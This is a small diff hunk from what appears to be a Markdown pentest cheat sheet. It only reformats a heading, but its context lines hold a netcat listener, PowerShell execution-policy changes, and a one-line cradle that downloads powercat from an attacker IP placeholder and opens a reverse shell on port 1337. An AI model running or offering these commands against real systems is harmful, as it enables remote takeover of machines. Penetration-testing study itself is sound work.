@@ -58,7 +58,7 @@ nc -lvnp 1337
 Get-ExecutionPolicy
 Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 ```
-Download and execute payload:
+- Download and execute payload:
 ```
 IEX(New-Object System.Net.WebClient).DownloadString('http://[Attacker's IP]:8080/powercat.ps1'); powercat -c [Attacker's IP] -p 1337 -ep
 ```
